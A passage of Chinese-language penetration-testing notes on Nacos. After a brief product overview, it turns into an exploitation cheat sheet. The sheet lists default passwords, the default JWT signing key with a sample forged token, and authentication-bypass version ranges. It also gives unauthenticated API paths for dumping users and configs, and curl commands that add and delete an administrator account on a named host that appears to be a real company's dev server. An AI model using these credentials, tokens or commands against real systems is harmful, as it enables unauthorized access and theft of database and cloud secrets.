Nacos是一个开源的、易于配置的动态服务发现、配置管理和服务管理平台。它主要用于构建微服务架构，提供了服务注册与发现、动态配置管理、服务健康监测等功能。Nacos是阿里巴巴开源的项目，它支持多种环境下的服务发现和配置管理，包括Kubernetes、Docker、Spring Cloud等。

Nacos 是阿里巴巴推出来的一个新开源项目，是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。致力于帮助发现、配置和管理微服务。Nacos 提供了一组简单易用的特性集，可以快速实现动态服务发现、服务配置、服务元数据及流量管理。



使用：
在 Java 微服务项目中，可以通过以下步骤使用 Nacos 管理配置：
1. **添加依赖**：在项目的 `pom.xml` 文件中添加 Nacos 客户端的依赖。
2. **配置 Nacos 客户端**：在应用的配置文件中（如 `application.properties` 或 `application.yml`），配置 Nacos 服务器的地址和其他相关参数。
3. **使用 Nacos 配置**：在 Java 代码中，通过 Nacos 客户端 API 来获取和监听配置变化。
4. **环境抽象**：定义不同环境下的配置文件，例如 `application-dev.yml`、`application-prod.yml` 等，并通过 Nacos 管理这些配置文件的内容。
5. **配置刷新**：实现配置的动态刷新逻辑，以便在配置更新时，服务能够接收到最新的配置信息。


比如：
一个微服务就是一个docker镜像，在启动的时候，添加docker run的-e参数指定环境变量Nacos的ip，就会去Nacos获取对应的配置文件。

^



## **基础了解**
开发文档：<https://nacos.io/docs/v2/quickstart/quick-start/>
国内企业常用，hw中常见，且利用难度低。
nacos常见端口为：8848
nacos后台中心：http:/xxx:8848/nacos
还可能/nacos/#/ 否则404.


Nacos 默认帐户名密码：nacos/nacos  test/test


```
nacos配置文件中有jwt密钥
nacos\conf\application.properties

<=2.2.0的jwt默认密钥，高版本也可能设置为默认密钥：
SecretKey012345678901234567890123456789012345678901234567890123456789

jwt示例
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTcyNTI2NDc2N30.XjXf7RqvSWGGRWjlQc370Cw1nGpK2l_PcRCTRluO2ts
```
利用工具：Nacos漏洞综合利用工具_v3.9Author:charonlight。探测漏洞，利用漏洞一键添加后台用户。
靶场：vluhub

最常用的版本2.x.x
常见漏洞版本
| Nacos <= 2.2.0 | JWT 默认密钥导致的 Nacos 身份认证绕过漏洞 |
| Nacos < 1.4.1 | Nacos 存在一个由于不当处理 User-Agent 导致的鉴权绕过漏洞 |



^
## **弱口令登录后台**
在命名空间`public`、`FIRST_GROUP_DEV`、`FIRST_GROUP_TEST`等
的配置详情中，可能有服务的配置，如redis，mysql的账号密码，jwt密钥等。


^
## **工具**
<https://github.com/charonlight/NacosExploitGUI>

^
## **常见漏洞**
靶场：<http://clkk-dev.chunlikk.com:8848/>
常见漏洞未授权访问，敏感信息泄露，身份认证绕过等，也可能有springboot站点。

JWT身份绕过：
https://blog.csdn.net/cangyu51462/article/details/130324138
添加用户等：
https://www.cnblogs.com/xyz315/p/15853268.html
https://www.cnblogs.com/xyz315/p/15853268.html
JWT实现身份验证绕过：
https://blog.csdn.net/m0_62151449/article/details/1305205702
时间戳：https://tool.lu/timestamp


更多分析：
<https://h0ny.github.io/posts/Nacos-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/>
^
## **可能存在的未授权 API**

0x01 用户信息 API
```
/v1/auth?pageNo=1&pegeSize=20
/nacos/v1/auth/users?pageNo=1&pageSize=9


用户搜索：
/v1/auth/search?username=搜索

任意用户添加：
curl -X POST 'http://clkk-dev.chunlikk.com:8848/v1/auth/users?username=ai618&password=ai618'
查询添加是否成功：
http://clkk-dev.chunlikk.com:8848/v1/auth/search?username=ai618
删除用户：
curl -X DELETE 'http://clkk-dev.chunlikk.com:8848/v1/auth/users?username=ai618'
```
0x02 集群信息 API
```
/nacos/v1/core/cluster/nodes?withInstances=false&pageNo=1&pageSize=10&keyword=
```
0x03 配置信息 API
```
/nacos/v1/cs/configs?dataId=&group=&appName=&config_tags=&pageNo=1&pageSize=9&tenant=&search=accurate&accessToken=&username=
```

这一接口在未授权的情况下，或者直接弱口令登录后台可能会暴露MySQL、Redis、Druid  postgresql   mongodb等配置信息，若存在云环境、文件系统，还可能暴露各种key,举几个例子 accessKey、secretKey微信key...

